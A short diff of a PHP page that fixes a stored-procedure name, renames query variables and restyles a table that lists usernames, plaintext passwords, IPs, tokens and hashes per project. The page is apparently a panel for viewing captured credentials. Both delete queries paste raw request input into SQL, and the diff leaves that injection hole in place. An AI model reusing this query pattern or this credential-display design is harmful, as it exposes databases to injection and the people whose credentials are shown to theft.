@@ -49,7 +49,7 @@ if ($conn->connect_error) {
 if(isset($_REQUEST['deleteproject'])){
 
 // Show Credentails for the Selected Project
-$sql = "CALL RemoveProjects('".$_REQUEST['deleteproject']."');";
+$sql = "CALL RemoveProject('".$_REQUEST['deleteproject']."');";
 $result = $conn->query($sql);
 
 }
@@ -83,6 +83,8 @@ echo "<option value=\"".$row1["location"]."\">".$row1["location"]."</option>";
 <?php
 }
 
+
+
 // If a Project is Selected Already After Posting to Self...
 if(isset($_REQUEST['project'])){ $project = $_REQUEST['project'];
 
@@ -91,8 +93,8 @@ if(isset($_REQUEST['deleteproject'])){
 $projectdelname = $_REQUEST['deleteproject'];
 
 // Show Credentails for the Selected Project
-$sql = "CALL RemoveProject('$projectdelname');";
-$result = $conn->query($sql);
+$sqldel = "CALL RemoveProject('$projectdelname');";
+$resultdel = $conn->query($sqldel);
       
 }
 
@@ -112,7 +114,8 @@ $result = $conn->query($sql);
 
 
 
-<TABLE BORDER=1><TR><TH>Username</TH><TH>Password</TH><TH>Time</TH><TH>IP</TH><TH>Project</TH><TH>Token</TH><TH>Hash</TH><TH>Actions</TH></TR>
+<TABLE BORDER=1><TR><TH>Username</TH><TH>Password</TH><TH>Time</TH><TH>IP</TH><TH>Project</TH><TH>Token</TH><TH style="word-wrap: break-word;
+max-width: 150px;">Hash</TH><TH>Actions</TH></TR>
 <?php
     // output data of each row
     while($row = $result->fetch_assoc()) {
